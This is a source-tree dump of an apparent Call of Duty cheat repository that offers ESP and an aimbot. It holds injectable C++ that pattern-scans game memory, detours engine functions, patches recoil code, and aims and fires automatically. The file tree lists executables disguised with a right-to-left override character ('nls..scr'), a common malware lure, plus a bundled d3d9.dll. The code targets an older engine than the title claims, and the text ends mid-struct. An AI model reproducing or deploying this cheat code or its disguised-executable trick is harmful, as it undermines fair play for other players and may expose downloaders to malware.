Project Path: arc_gmh5225_Call-Of-Duty-Vanguard-Hack-Esp-AImbot-Unlock-All_uom16vxm

Source Tree:

```txt
arc_gmh5225_Call-Of-Duty-Vanguard-Hack-Esp-AImbot-Unlock-All_uom16vxm
├── Esp & Aim
│   ├── Cod Esp AIm‮nls..scr
│   ├── DrawEngine
│   │   ├── Draw.cpp
│   │   └── Draw.h
│   ├── aimbot.cpp
│   ├── aimbot.h
│   ├── cDraw.cpp
│   ├── dllmain.cpp
│   ├── dllmain.h
│   ├── dvar.cpp
│   ├── dvar.h
│   ├── engine.h
│   ├── hack.vcxproj
│   ├── hack.vcxproj.filters
│   ├── main.cpp
│   ├── math.cpp
│   ├── math.h
│   ├── memhack.h
│   ├── stdafx.h
│   └── types.h
├── Injector Features
│   ├── Cod Injector Wz‮nls..scr
│   ├── Extern
│   │   ├── Huffman.cpp
│   │   └── Huffman.hpp
│   ├── Game
│   │   └── MW2
│   │       ├── Client.cpp
│   │       ├── Client.hpp
│   │       ├── Exploit.cpp
│   │       ├── Exploit.hpp
│   │       ├── Handler.cpp
│   │       └── Handler.hpp
│   ├── Icon.ico
│   ├── Network
│   │   ├── Address.cpp
│   │   ├── Address.hpp
│   │   ├── Sniffer.cpp
│   │   └── Sniffer.hpp
│   ├── Resource.rc
│   ├── STDInclude.cpp
│   ├── STDInclude.hpp
│   ├── Utils
│   │   ├── IO.cpp
│   │   ├── IO.hpp
│   │   ├── InfoString.cpp
│   │   ├── InfoString.hpp
│   │   ├── Lock.cpp
│   │   ├── Lock.hpp
│   │   ├── Memory.cpp
│   │   ├── Memory.hpp
│   │   ├── NT.cpp
│   │   ├── NT.hpp
│   │   ├── Network.cpp
│   │   ├── Network.hpp
│   │   ├── Queue.hpp
│   │   ├── Signal.hpp
│   │   ├── SignalHandler.cpp
│   │   ├── SignalHandler.hpp
│   │   ├── String.cpp
│   │   ├── String.hpp
│   │   ├── Time.cpp
│   │   ├── Time.hpp
│   │   ├── Utils.cpp
│   │   └── Utils.hpp
│   └── main.cpp
├── Offsets menu
│   ├── Addresses.h
│   ├── Base.cpp
│   ├── Classes.h
│   ├── Cod Vanguard Offsets Dumper‮nls..scr
│   ├── ColorDefinitions.h
│   ├── Functions.h
│   ├── Hacks.h
│   ├── Menu.cpp
│   ├── Menu.h
│   ├── NoName.suo
│   ├── NoName.v12.suo
│   ├── NoName.vcxproj
│   ├── NoName.vcxproj.filters
│   ├── NoName.vcxproj.user
│   ├── SystemIncludes.h
│   └── d3d9.dll
└── README.md

```

`Esp & Aim/DrawEngine/Draw.cpp`:

```cpp
#include "Draw.h"

cdraw Draw;

int cdraw::trap_R_RegisterFont( const char * fontName, int pointSize ) 
{ 
    return ( ( int( *)( const char * fontName, int pointSize ) )d_RegisterFont )
        ( fontName, pointSize ); 
}

int cdraw::trap_R_RegisterShader( const char * name, int i1, int i2 )
{
    return ( ( int( *)( const char * name, int, int ) )d_RegisterShader )
        ( name, i1, i2 );
}

void cdraw::trap_R_DrawStretchPic( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float * colour, LPSTR shader )
{
    ( ( void( *)( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float * colour, int shader ) )d_DrawStretchPic )
        ( x, y, width, height, s1, t1, s2, t2, colour, trap_R_RegisterShader( (char*)shader, 3, 7 ) );
}

void cdraw::trap_R_DrawRotatedPic( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float angle, float * colour, LPSTR shader )
{
    ( ( void( *)( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float angle, float * colour, int shader ) )d_DrawRotatedPic )
        ( x, y, width, height, s1, t1, s2, t2, angle, colour, trap_R_RegisterShader( (char*)shader, 3, 7 ) );
}

void cdraw::trap_R_DrawStringExt( const char * text, int type, LPSTR font, float x, float y, float scalex, float scaley, float * colour, int style )
{
    ( ( void( *)( const char * text, int type, int font, float x, float y, float scalex, float scaley, float * colour, int style ) )d_DrawStringExt )
        ( text, type, trap_R_RegisterFont( (char*)font, 1 ), x, y, scalex, scaley, colour, style );
}

float cdraw::TextWidth( char *text, size_t len, LPSTR font )
{
    return (float)( ( int( *)( char *, size_t, int ) )d_TextWidth )
        ( text, len, trap_R_RegisterFont( font, 1 ) );
}

BOOL cdraw::bCompare( const BYTE *pData, const BYTE *bMask, const char *szMask )
{
    for ( ; *szMask; szMask++, bMask++, pData++ )
        if ( *szMask == 'x' && *pData != *bMask )
            return false;
    return ( *szMask ) == 0;
}

DWORD cdraw::FindPattern( DWORD dwAddress, DWORD dwLen, BYTE *bMask, char *szMask )
{
    for ( DWORD i = 0; i < dwLen; i++ )
        if ( bCompare( (BYTE*)dwAddress + i, bMask, szMask ) )
            return (DWORD)( dwAddress + i );
    return -1;
}

void cdraw::initialization()
{
    DWORD startaddr = (DWORD)GetModuleHandleA( "gfx_d3d_mp_x86_s.dll" );

    BYTE bytes_stretchpic[] = { 139, 13, 0, 0, 0, 0, 139, 145, 0, 0, 0, 0, 184, 0, 0, 0, 0, 86, 139, 177, 0, 0, 0, 0, 43, 194, 141, 132, 48, 0, 0, 0, 0, 131, 248, 44, 125, 12, 199, 129, 0, 0, 0, 0, 0, 0, 0, 0, 94, 195 };
    d_DrawStretchPic = FindPattern( startaddr, 0x128000, bytes_stretchpic, "xx????xx????x????xxx????xxxxx????xxxxxxx????????xx" );

    BYTE bytes_rotatedpic[] = { 81, 161, 0, 0, 0, 0, 139, 144, 0, 0, 0, 0, 185, 0, 0, 0, 0, 86 };
    d_DrawRotatedPic = FindPattern( startaddr, 0x128000, bytes_rotatedpic, "xx????xx????x????x" );

    BYTE bytes_stringext[] = { 139, 68, 36, 4, 128, 56, 0, 15, 132, 0, 0, 0, 0, 141, 80, 1, 138, 8, 64, 132, 201, 117, 249, 139, 13, 0, 0, 0, 0, 43, 194, 83, 86, 139, 177, 0, 0, 0, 0, 139, 216, 186, 0, 0, 0, 0, 87 };
    d_DrawStringExt = FindPattern( startaddr, 0x128000, bytes_stringext, "xxxxxx?xx????xxxxxxxxxxxx????xxxxxx????xxx????x" );

    BYTE bytes_regfont[] = { 161, 0, 0, 0, 0, 83, 85, 86, 51, 237, 133, 192, 87, 126, 113, 144 };
    d_RegisterFont = FindPattern( startaddr, 0x128000, bytes_regfont, "x????xxxxxxxxxxx" );

    BYTE bytes_regshader[] = { 139, 68, 36, 4, 128, 56, 0, 117, 6, 161, 0, 0, 0, 0, 195, 139, 76, 36, 12, 81, 232, 0, 0, 0, 0, 131, 196, 4 };
    d_RegisterShader = FindPattern( startaddr, 0x128000, bytes_regshader, "xxxxxx?xxx????xxxxxxx????xxx" );

    BYTE bytes_textwidth[] = { 81, 139, 68, 36, 12, 85, 86 };
    d_TextWidth = FindPattern( startaddr, 0x128000, bytes_textwidth, "xxxxxxx" );
}

void cdraw::Text( float x, float y, float size1, float size2, float *colour, int align, LPSTR font, int shadow, const char *txtformat, ... )
{
    char szBuffer[ 512 ] = "";
    va_list	ap;

    va_start( ap, txtformat );
    _vsnprintf_s( szBuffer, 512, 511, txtformat, ap );
    va_end( ap );

    float wdth_t = this->TextWidth( szBuffer, 0, font );

    if ( align & ALIGN_RIGHT ) x -= wdth_t;
    if ( align & ALIGN_CENTER ) x -= wdth_t * 0.5f;

    trap_R_DrawStringExt( szBuffer, 0x7FFFFFFF, font, x, y, size1, size2, colour, shadow );
}

void cdraw::Box( float x, float y, float width, float height, float *colour, float rotate )
{
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 0, 1, rotate, colour, SHADERWHITE );
}

void cdraw::Gradient( float x, float y, float width, float height, float *colour1, float *colour2, bool horizontal )
{
    float fAdd = ( horizontal ? 0 : width / 2 - height / 2 );
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 1, 1, 0, colour2, SHADERWHITE );
    trap_R_DrawRotatedPic( x + fAdd, y - fAdd, ( horizontal ? width : height ), ( horizontal ? height : width ), 0.5f, 0, 1, 1, ( horizontal ? 0.0f : 90.0f ), colour1, SHADERGRADIENT );
}

void cdraw::Shader( float x, float y, float width, float height, float *colour, LPSTR shader, float rotate )
{
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 1, 1, rotate, colour, shader );
}

void cdraw::Border( float x, float y, float width, float height, float size, float *colour )
{
    Box( x, ( y - size ), ( width + size ), size, colour );
    Box( ( x + width ), ( y - size ), size, ( height + 2 * size ), colour );
    Box( ( x - size ), ( y + height ), ( width + 2 * size ), size, colour );
    Box( ( x - size ), ( y - size ), size, ( height + 2 * size ), colour );
}

void cdraw::Line( float startX, float startY, float endX, float endY, float *colour, float width )
{
    float sizeX = endX - startX;
    float sizeY = endY - startY;
    float size = (float)sqrt( ( sizeX*sizeX ) + ( sizeY*sizeY ) );

    float x = ( startX + ( sizeX / 2 ) ) - ( size / 2 );
    float y = startY + ( sizeY / 2 );
    float angle = (float)RAD2DEG( atan( sizeY / sizeX ) );
    trap_R_DrawRotatedPic( x, y, size, width, 2, 2, 0, 0, angle, colour, SHADERWHITE );
}
```

`Esp & Aim/DrawEngine/Draw.h`:

```h
#pragma once
#include <Windows.h>
#include <stdio.h>
#include <math.h>

#ifndef M_PI
#define M_PI					3.14159265358979323846f
#endif

#define RAD2DEG( a )			( ( (a) * 180.0f ) / M_PI )

#define DRGBA(r,g,b,a)          {(r)/255.0f,(g)/255.0f,(b)/255.0f,(a)/255.0f}
#define DRGB(r,g,b)             RGBA(r,g,b,255)

#define ALIGN_LEFT      0
#define ALIGN_RIGHT     1
#define ALIGN_CENTER    2

#define FONTCONSOLE		"fonts/consoleFont"
#define FONTNORMAL		"fonts/normalFont"
#define FONTSMALL		"fonts/smallFont"
#define FONTBIG			"fonts/bigFont"
#define FONTEXTRABIG	"fonts/extraBigFont"
#define	FONTBOLD		"fonts/boldFont"
#define FONTBIGDEF		"fonts/bigDevFont"
#define FONTSMALLDEF	"fonts/smallDevFont"

#define SHADERBLACK		"black"
#define SHADERWHITE		"white"
#define SHADERGRADIENT	"ui/assets/gradientbar2"
#define SHADERCURSOR	"ui/assets/3_cursor3"
#define SHADERARROW		"hud_grenadepointer"

typedef float colour[ 4 ];

class cdraw
{
private:
    DWORD   d_RegisterShader;
    DWORD   d_DrawStretchPic;
    DWORD   d_DrawRotatedPic;
    DWORD   d_RegisterFont;
    DWORD   d_TextWidth;
    DWORD   d_DrawStringExt;

    BOOL    bCompare        ( const BYTE *pData, const BYTE *bMask, const char *szMask );
    DWORD   FindPattern     ( DWORD dwAddress, DWORD dwLen, BYTE *bMask, char *szMask );

    void    trap_R_DrawStringExt    ( const char * text, int type, LPSTR font, float x, float y, float scalex, float scaley, float * colour, int style );
    void    trap_R_DrawStretchPic   ( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float * colour, LPSTR shader );
    void    trap_R_DrawRotatedPic   ( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float angle, float * colour, LPSTR shader );
    int     trap_R_RegisterFont     ( const char * fontName, int pointSize );
    int     trap_R_RegisterShader   ( const char * name, int i1, int i2 );

public:
    void    initialization();

    float   TextWidth   ( char *text, size_t len, LPSTR font );
    void    Text        ( float x, float y, float size1, float size2, float *colour, int align, LPSTR font, int shadow, const char *txtformat, ... );
    void    Box         ( float x, float y, float width, float height, float *colour, float rotate = 0.0f );
    void    Gradient    ( float x, float y, float width, float height, float *colour1, float *colour2, bool horizontal );
    void    Shader      ( float x, float y, float width, float height, float *colour, LPSTR shader, float rotate = 0.0f );
    void    Border      ( float x, float y, float width, float height, float size, float *colour );
    void    Line        ( float startX, float startY, float endX, float endY, float *colour, float width );
};

extern cdraw Draw;

```

`Esp & Aim/aimbot.cpp`:

```cpp
#include "dllmain.h"

cAimbot aim;
std::vector<BotTarget_t> Targets;
std::vector<model_t> models;

bool cAimbot::SortMinDist( BotTarget_t lhs, BotTarget_t rhs )
{
    return ( lhs.distance < rhs.distance );
}

bool cAimbot::SortMaxDist( BotTarget_t lhs, BotTarget_t rhs )
{
    return ( lhs.distance > rhs.distance );
}

bool cAimbot::SortMinFov( BotTarget_t lhs, BotTarget_t rhs )
{
    float fLHS = ( lhs.aimangles[ 0 ] * lhs.aimangles[ 0 ] ) + ( lhs.aimangles[ 1 ] * lhs.aimangles[ 1 ] );
    float fRHS = ( rhs.aimangles[ 0 ] * rhs.aimangles[ 0 ] ) + ( rhs.aimangles[ 1 ] * rhs.aimangles[ 1 ] );

    return ( fLHS < fRHS );
}

void cAimbot::AddZombie( refEntity_t * ent, shaderInfo_t * si, centity_t * cent )
{
    BotTarget_t zom;

    zom.ent = ent;
    zom.si = si;
    zom.cent = cent;

    vec3_t origin;
    VectorCopy( zom.ent->origin, origin );
    origin[ 2 ] += zom.si->point2[ 2 ] - zom.si->point2[2] / 3;

    GetAngleToOrigin( origin, zom.aimangles );

    zom.distance = GetDistance( origin );

    if ( IsVisible( origin ) )
    {
        zom.visible = true;
        findzom = true;
    }
    else
    {
        zom.visible = false;
    }

    zom.fov_x = (int)fabs( zom.aimangles[ PITCH ] ) * 2;
    zom.fov_y = (int)fabs( zom.aimangles[ YAW ] ) * 2;

    Targets.push_back( zom );
}

int cAimbot::GetFirstZombie()
{
    if ( !dv_aimbot_filter || !findzom )
        return -1;

    switch ( dv_aimbot_filter->iValue )
    {
    case 0: // Min distance
        std::sort( Targets.begin(), Targets.end(), SortMinDist );
        break;
    case 1:	// Max distance
        std::sort( Targets.begin(), Targets.end(), SortMaxDist );
        break;
    case 2: // Min angle
        std::sort( Targets.begin(), Targets.end(), SortMinFov );
        break;
    };

    for ( size_t i = 0; i < Targets.size(); i++ )
    {
        if ( !Targets[ i ].visible )
            continue;

        aimangles[ PITCH ] = Targets[ i ].aimangles[ PITCH ];
        aimangles[ YAW ] = Targets[ i ].aimangles[ YAW ];
        aimangles[ ROLL ] = Targets[ i ].aimangles[ ROLL ];

        return i;
    }

    return -1;
}

void cAimbot::AutoAim()
{
    set.viewangles[ PITCH ] += aimangles[ PITCH ];
    set.viewangles[ YAW ] += aimangles[ YAW ];
    set.viewangles[ ROLL ] += aimangles[ ROLL ];

    if ( dv_aimbot_autoshoot && dv_aimbot_autoshoot->iValue == 1 )
        set.Shoot = true;
}

void cAimbot::SilentAim( int num_player )
{
    userCmd_t *cmd = set.input->GetUserCmd( set.input->currentCmdNum );
    userCmd_t *oldcmd = set.input->GetUserCmd( set.input->currentCmdNum - 1 );
    *oldcmd = *cmd;
    cmd->ServerTime++;
    set.input->currentCmdNum++;

    cmd->ViewAngle[ 0 ] += ANGLE2SHORT( aimangles[ 0 ] );
    cmd->ViewAngle[ 1 ] += ANGLE2SHORT( aimangles[ 1 ] );
    cmd->ViewAngle[ 2 ] += ANGLE2SHORT( aimangles[ 2 ] );

    if ( dv_aimbot_autoshoot && dv_aimbot_autoshoot->iValue == 1 )
        set.Shoot = true;
}

void cAimbot::Aiming( int num_player )
{
    if ( num_player < 0 || !dv_aimbot || dv_aimbot->iValue == 0 )
        return;

    if ( ( dv_aimbot_key->iValue > 0 && set.Aimkeypress ) || !dv_aimbot_key->iValue )
    {
        switch ( dv_aimbot->iValue )
        {
        case 1:
            AutoAim();
            break;
        case 2:
            SilentAim( num_player );
            break;
        }
    }

    Targets.clear();
    findzom = false;
}
```

`Esp & Aim/aimbot.h`:

```h
#pragma once

class cAimbot
{
private:
    static bool     SortMinDist( BotTarget_t lhs, BotTarget_t rhs );
    static bool     SortMaxDist( BotTarget_t lhs, BotTarget_t rhs );
    static bool     SortMinFov( BotTarget_t lhs, BotTarget_t rhs );

    void            SilentAim( int num_zombie );
    void            AutoAim();

    vec3_t          aimangles;
    bool            findzom;
public:
    void            AddZombie( refEntity_t * ent, shaderInfo_t * si, centity_t * cent );
    int             GetFirstZombie();
    void            Aiming( int num_zombie );
};

extern cAimbot aim;
extern std::vector<model_t> models;
```

`Esp & Aim/cDraw.cpp`:

```cpp
#include "dllmain.h"

cdraw Draw;

int cdraw::trap_R_RegisterFont( const char * fontName, int pointSize )
{
    return ( ( int( *)( const char * fontName, int pointSize ) )d_RegisterFont )
        ( fontName, pointSize );
}

int cdraw::trap_R_RegisterShader( const char * name, int i1, int i2 )
{
    return ( ( int( *)( const char * name, int, int ) )d_RegisterShader )
        ( name, i1, i2 );
}

void cdraw::trap_R_DrawStretchPic( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float * colour, LPSTR shader )
{
    ( ( void( *)( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float * colour, int shader ) )d_DrawStretchPic )
        ( x, y, width, height, s1, t1, s2, t2, colour, trap_R_RegisterShader( (char*)shader, 3, 7 ) );
}

void cdraw::trap_R_DrawRotatedPic( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float angle, float * colour, LPSTR shader )
{
    ( ( void( *)( float x, float y, float width, float height, float s1, float t1, float s2, float t2, float angle, float * colour, int shader ) )d_DrawRotatedPic )
        ( x, y, width, height, s1, t1, s2, t2, angle, colour, trap_R_RegisterShader( (char*)shader, 3, 7 ) );
}

void cdraw::trap_R_DrawStringExt( const char * text, int type, LPSTR font, float x, float y, float scalex, float scaley, float * colour, int style )
{
    ( ( void( *)( const char * text, int type, int font, float x, float y, float scalex, float scaley, float * colour, int style ) )d_DrawStringExt )
        ( text, type, trap_R_RegisterFont( (char*)font, 1 ), x, y, scalex, scaley, colour, style );
}

float cdraw::TextWidth( char *text, size_t len, LPSTR font )
{
    return (float)( ( int( *)( char *, size_t, int ) )d_TextWidth )
        ( text, len, trap_R_RegisterFont( font, 1 ) );
}

BOOL cdraw::bCompare( const BYTE *pData, const BYTE *bMask, const char *szMask )
{
    for ( ; *szMask; szMask++, bMask++, pData++ )
        if ( *szMask == 'x' && *pData != *bMask )
            return false;
    return ( *szMask ) == 0;
}

DWORD cdraw::FindPattern( DWORD dwAddress, DWORD dwLen, BYTE *bMask, char *szMask )
{
    for ( DWORD i = 0; i < dwLen; i++ )
        if ( bCompare( (BYTE*)dwAddress + i, bMask, szMask ) )
            return (DWORD)( dwAddress + i );
    return -1;
}

void cdraw::initialization()
{
    DWORD startaddr = (DWORD)GetModuleHandleA( "gfx_d3d_mp_x86_s.dll" );

    BYTE bytes_stretchpic[] = { 139, 13, 0, 0, 0, 0, 139, 145, 0, 0, 0, 0, 184, 0, 0, 0, 0, 86, 139, 177, 0, 0, 0, 0, 43, 194, 141, 132, 48, 0, 0, 0, 0, 131, 248, 44, 125, 12, 199, 129, 0, 0, 0, 0, 0, 0, 0, 0, 94, 195 };
    d_DrawStretchPic = FindPattern( startaddr, 0x128000, bytes_stretchpic, "xx????xx????x????xxx????xxxxx????xxxxxxx????????xx" );

    BYTE bytes_rotatedpic[] = { 81, 161, 0, 0, 0, 0, 139, 144, 0, 0, 0, 0, 185, 0, 0, 0, 0, 86 };
    d_DrawRotatedPic = FindPattern( startaddr, 0x128000, bytes_rotatedpic, "xx????xx????x????x" );

    BYTE bytes_stringext[] = { 139, 68, 36, 4, 128, 56, 0, 15, 132, 0, 0, 0, 0, 141, 80, 1, 138, 8, 64, 132, 201, 117, 249, 139, 13, 0, 0, 0, 0, 43, 194, 83, 86, 139, 177, 0, 0, 0, 0, 139, 216, 186, 0, 0, 0, 0, 87 };
    d_DrawStringExt = FindPattern( startaddr, 0x128000, bytes_stringext, "xxxxxx?xx????xxxxxxxxxxxx????xxxxxx????xxx????x" );

    BYTE bytes_regfont[] = { 161, 0, 0, 0, 0, 83, 85, 86, 51, 237, 133, 192, 87, 126, 113, 144 };
    d_RegisterFont = FindPattern( startaddr, 0x128000, bytes_regfont, "x????xxxxxxxxxxx" );

    BYTE bytes_regshader[] = { 139, 68, 36, 4, 128, 56, 0, 117, 6, 161, 0, 0, 0, 0, 195, 139, 76, 36, 12, 81, 232, 0, 0, 0, 0, 131, 196, 4 };
    d_RegisterShader = FindPattern( startaddr, 0x128000, bytes_regshader, "xxxxxx?xxx????xxxxxxx????xxx" );

    BYTE bytes_textwidth[] = { 81, 139, 68, 36, 12, 85, 86 };
    d_TextWidth = FindPattern( startaddr, 0x128000, bytes_textwidth, "xxxxxxx" );
}

void cdraw::Text( float x, float y, float size1, float size2, float *colour, int align, LPSTR font, int shadow, const char *txtformat, ... )
{
    char szBuffer[ 512 ] = "";
    va_list	ap;

    va_start( ap, txtformat );
    _vsnprintf_s( szBuffer, 512, 511, txtformat, ap );
    va_end( ap );

    float wdth_t = this->TextWidth( szBuffer, 0, font );

    if ( align & ALIGN_RIGHT ) x -= wdth_t;
    if ( align & ALIGN_CENTER ) x -= wdth_t * 0.5f;

    trap_R_DrawStringExt( szBuffer, 0x7FFFFFFF, font, x, y, size1, size2, colour, shadow );
}

void cdraw::Box( float x, float y, float width, float height, float *colour, float rotate )
{
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 0, 1, rotate, colour, SHADERWHITE );
}

void cdraw::Gradient( float x, float y, float width, float height, float *colour1, float *colour2, bool horizontal )
{
    float fAdd = ( horizontal ? 0 : width / 2 - height / 2 );
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 1, 1, 0, colour2, SHADERWHITE );
    trap_R_DrawRotatedPic( x + fAdd, y - fAdd, ( horizontal ? width : height ), ( horizontal ? height : width ), 0.5f, 0, 1, 1, ( horizontal ? 0.0f : 90.0f ), colour1, SHADERGRADIENT );
}

void cdraw::Shader( float x, float y, float width, float height, float *colour, LPSTR shader, float rotate )
{
    trap_R_DrawRotatedPic( x, y, width, height, 0, 0, 1, 1, rotate, colour, shader );
}

void cdraw::Border( float x, float y, float width, float height, float size, float *colour )
{
    Box( x, ( y - size ), ( width + size ), size, colour );
    Box( ( x + width ), ( y - size ), size, ( height + 2 * size ), colour );
    Box( ( x - size ), ( y + height ), ( width + 2 * size ), size, colour );
    Box( ( x - size ), ( y - size ), size, ( height + 2 * size ), colour );
}

void cdraw::Line( float startX, float startY, float endX, float endY, float *colour, float width )
{
    float sizeX = endX - startX;
    float sizeY = endY - startY;
    float size = (float)sqrt( ( sizeX*sizeX ) + ( sizeY*sizeY ) );

    float x = ( startX + ( sizeX / 2 ) ) - ( size / 2 );
    float y = startY + ( sizeY / 2 );
    float angle = (float)RAD2DEG( atan( sizeY / sizeX ) );
    trap_R_DrawRotatedPic( x, y, size, width, 2, 2, 0, 0, angle, colour, SHADERWHITE );
}
```

`Esp & Aim/dllmain.cpp`:

```cpp
#include "dllmain.h"

set_t set;

typedef void( *oStereoFrame ) ( );
oStereoFrame pStereoFrame;

typedef int( WINAPIV *t_AddRefEntityToScene )( refEntity_t * ent, shaderInfo_t * si, centity_t * cent );
t_AddRefEntityToScene o_AddRefEntityToScene;

char *zombie_list[] = {
    "iwx_nazi",
    "wolfrun",
    "wolfattack",
    "horrortulajdona_pssf",
    "horror_arab_rotu",
    "horror_rotu",
    "horror_bigblood",
    "inak_dog",
    "oma_diana2",
    "oma_zombie",
    "oma_zom_cellbreaker",
    "van_mon",
    NULL
};

void hStereoFrame()
{
    pStereoFrame();

    if ( set.cg->snap )
    {
        if ( dv_aimbot_norecoil )
        {
            if ( dv_aimbot_norecoil->iValue )
                MemoryWrite( (void*)0x004D7115, ( void* )"\x75", 1 );
            else
                MemoryWrite( (void*)0x004D7115, ( void* )"\x74", 1 );
        }

        if ( dv_aimbot && dv_aimbot->iValue > 0 )
        {
            for ( int i = 0; i < models.size(); i++ )
                aim.AddZombie( &models[i].ent, &models[ i ].si, &models[ i ].cent );

            int num = aim.GetFirstZombie();
            aim.Aiming( num );
            models.clear();
        }
    }
}

int RE_AddRefEntityToScene( refEntity_t * ent, shaderInfo_t * si, centity_t * cent )
{
    if ( ent->reType == RT_MODEL )
    {
        if ( dv_aimbot && dv_aimbot->iValue > 0 )
        {
            for ( int i = 0; zombie_list[ i ]; i++ )
            {
                if ( strstr( *(char **)( si->model + 2 ), zombie_list[ i ] ) )
                {
                    model_t model;

                    model.ent = *ent;
                    model.si = *si;
                    model.cent = *cent;

                    models.push_back( model );
                }
            }
        }
    }

    return o_AddRefEntityToScene( ent, si, cent );
}

void __stdcall KeyHook()
{
    DWORD keys[] = { 0, VK_RBUTTON, VK_LBUTTON, VK_LSHIFT, VK_MENU };

    for ( ;; Sleep( 20 ) )
    {
        if ( dv_aimbot_key && KEY_DOWN( keys[ dv_aimbot_key->iValue ] ) )
            set.Aimkeypress = true;
        else
            set.Aimkeypress = false;

        if ( set.Shoot )
        {
            keybd_event( VK_LBUTTON, 0, 0, 0 );
            keybd_event( VK_LBUTTON, 0, KEYEVENTF_KEYUP, 0 );
            set.Shoot = false;
        }
    }
}

void mymain()
{
    while ( GetModuleHandleA( "gfx_d3d_mp_x86_s.dll" ) == 0 || GetModuleHandleA( "mssmp3.asi" ) == 0 || GetModuleHandleA( "d3d9.dll" ) == 0 )
        Sleep( 100 );

    set.gfx_dll = (DWORD)LoadLibraryA( "gfx_d3d_mp_x86_s.dll" );
    set.cg = (cg_t*)0x014EE080;
    set.viewangles = (float *)0x0098FDEC;
    set.input = (input_t *)0x009CFE2C;

    Draw.initialization();
    register_dvars();

    o_AddRefEntityToScene = (t_AddRefEntityToScene)DetourFunction( (PBYTE)( set.gfx_dll + 0x241A0 ), (PBYTE)RE_AddRefEntityToScene );
    pStereoFrame = (oStereoFrame)DetourFunction( (PBYTE)( 0x004CBCA0 ), (PBYTE)hStereoFrame );
}

bool __stdcall DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
    DisableThreadLibraryCalls( hinstDLL );

    switch ( fdwReason )
    {
    case DLL_PROCESS_ATTACH:
        CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)mymain, NULL, NULL, NULL );
        CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)KeyHook, NULL, NULL, NULL );
        break;
    }

    return true;
}
```

`Esp & Aim/dllmain.h`:

```h
#pragma once

#include "stdafx.h"
#include "memhack.h"
#include "DrawEngine\Draw.h"
#include "engine.h"
#include "types.h"
#include "dvar.h"
#include "math.h"
#include "aimbot.h"
```

`Esp & Aim/dvar.cpp`:

```cpp
#include "dllmain.h"

enum_type aimtype[] = { "Off", "Auto aim", "Silent aim", NULL };
enum_type aimkey[] = { "Off", "Left mouse", "Right Mouse", "Shift", "Alt", NULL };
enum_type aimfilter[] = { "Min distance", "Max distance", "Min FOV", NULL };

dvar_t *dv_aimbot;
dvar_t *dv_aimbot_fov;
dvar_t *dv_aimbot_key;
dvar_t *dv_aimbot_filter;
dvar_t *dv_aimbot_norecoil;
dvar_t *dv_aimbot_autoshoot;

void register_dvars()
{
    dv_aimbot = RegisterEnum( "zombot_aimbot", aimtype, 0, 0 );
    dv_aimbot_key = RegisterEnum( "zombot_aimkey", aimkey, 0, 0 );
    dv_aimbot_filter = RegisterEnum( "zombot_filter", aimfilter, 0, 0 );

    CmdConsole( "dvar_bool zombot_norecoil 0 " );
    CmdConsole( "dvar_bool zombot_autoshoot 0 " );

    dv_aimbot_norecoil = Dvar_FindDvar( "zombot_norecoil" );
    dv_aimbot_autoshoot = Dvar_FindDvar( "zombot_norecoil" );
}

dvar_t * Dvar_FindDvar( const char * name )
{
    static dvar_t *dvarList = (dvar_t *)0x00C5C9D0;

    for ( int i = 0; i < 0x500; i++ )
    {
        if ( dvarList[ i ].name )
        {
            if ( _stricmp( dvarList[ i ].name, name ) == 0 )
                return &( dvarList[ i ] );
        }
    }

    return NULL;
}
```

`Esp & Aim/dvar.h`:

```h
#pragma once

typedef struct
{
    const char *	name;
    int				flags;
    //LPVOID		value;
    union
    {
        float		fValue;
        float *		pVectorValue;
        int			iValue;
        ULONG		ulValue;
        char *		pStringValue;
        bool		boolValue;
    };
    LPVOID			value2;
    LPVOID			value3;
    LPVOID			min;
    LPVOID			max;
    int				pad[ 2 ];
} dvar_t;

typedef const char *enum_type;

void register_dvars();
dvar_t * Dvar_FindDvar( const char * name );

extern dvar_t *dv_aimbot;
extern dvar_t *dv_aimbot_fov;
extern dvar_t *dv_aimbot_key;
extern dvar_t *dv_aimbot_filter;
extern dvar_t *dv_aimbot_norecoil;
extern dvar_t *dv_aimbot_autoshoot;
```

`Esp & Aim/engine.h`:

```h
#pragma once

#define RegisterEnum ( ( dvar_t * ( * )( const char * var_name, enum_type enum_values[], int initial, int flags ) )0x004383A0 )
#define CmdConsole  ( ( void (*)( char * ) )0x004214C0 )

typedef float vec_t;
typedef vec_t vec2_t[ 2 ];
typedef vec_t vec3_t[ 3 ];
typedef vec_t vec4_t[ 4 ];

typedef int qhandle_t;
typedef int qbool;

typedef enum
{
    RT_MODEL,
    RT_POLY,
    RT_SPRITE,
    RT_ORIENTED_QUAD,
    RT_LINE,
    RT_ELECTRICITY,
    RT_CYLINDER,
    RT_LATHE,
    RT_BEAM,
    RT_SABER_GLOW,
    RT_PORTALSURFACE,		// doesn't draw anything, just info for portals
    RT_CLOUDS,

    RT_MAX_REF_ENTITY_TYPE
} refEntityType_t;

typedef struct
{
    float		fraction;
    vec3_t		endpos;
    int			surfaceFlags;
    qbool		allSolid;
    int			contents;
    short		entityNum;
    short		pad0;
    int			pad1;
} trace_t;

typedef struct
{
    refEntityType_t reType;
    int renderfx;
    vec3_t lightingOrigin;
    vec3_t axis[ 3 ];
    float axisScale; //normally 1.0
    vec3_t origin;
    long padding1[ 4 ];
    BYTE shaderRGBA[ 4 ];
    long padding2[ 6 ];
} refEntity_t; //size=116, dw=29

typedef struct
{
    int pad0;
    int pointer;
    int frame;
    int pad1;
    int num;
    int pointer1;
    int render;
    qhandle_t *model;
    int pad2[ 11 ];
    vec3_t point1;
    vec3_t point2;
    int pad3[ 5 ];
} shaderInfo_t;

typedef struct
{
    int		trType;
    int		trTime;
    int		trDuration;
    vec3_t	trBase;
    vec3_t	trDelta;
} trajectory_t;

typedef struct
{
    int				number;
    int				eType;
    int				eFlags;
